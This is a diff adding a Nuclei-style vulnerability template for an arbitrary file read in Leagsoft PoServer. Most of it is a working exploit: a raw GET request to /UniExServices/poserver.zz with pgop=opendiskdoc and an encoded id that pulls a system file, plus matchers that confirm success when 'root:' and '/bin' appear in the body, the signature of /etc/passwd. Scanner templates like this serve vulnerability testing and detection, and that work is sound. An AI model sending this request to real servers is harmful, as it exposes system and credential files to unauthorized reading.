@@ -1,0 +1,36 @@
+id: poc-yaml-leagsoft-poserver-zz-anyfile-read
+info:
+  name: Leagsoft PoServer Any File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags:
+    - file-read
+    - leagsoft
+http:
+  - raw:
+      - |
+        GET /UniExServices/poserver.zz?pgop=opendiskdoc&id=KmcgY3MtK3IpLSRfOXE9YmpkL2orbBdrKztnJCltInIrbDhyP24rOzhjPHI= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+      - type: word
+        part: body
+        words:
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
